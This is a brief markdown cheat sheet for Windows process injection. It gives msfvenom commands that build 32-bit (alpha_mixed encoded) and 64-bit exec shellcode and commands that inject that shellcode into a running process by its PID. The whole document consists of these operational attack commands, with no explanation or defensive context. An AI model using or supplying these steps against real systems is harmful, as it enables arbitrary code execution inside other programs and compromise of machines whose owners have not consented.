## Windows

### 32bit

`\windows\syswow64\cmd.exe`

`msfvenom -p windows/exec CMD="c:\path\to\prog.exe arg arg" EXITFUNC=thread -e x86/alpha_mixed -f raw -o exec.txt`

`shellcode_inject.exe PID32 exec.txt`

### 64bit

`msfvenom -p windows/x64/exec CMD="c:\path\to\prog.exe arg arg" EXITFUNC=thread -f raw -o exec.bin`

`shellcode_inject64.exe PID64 exec.bin`
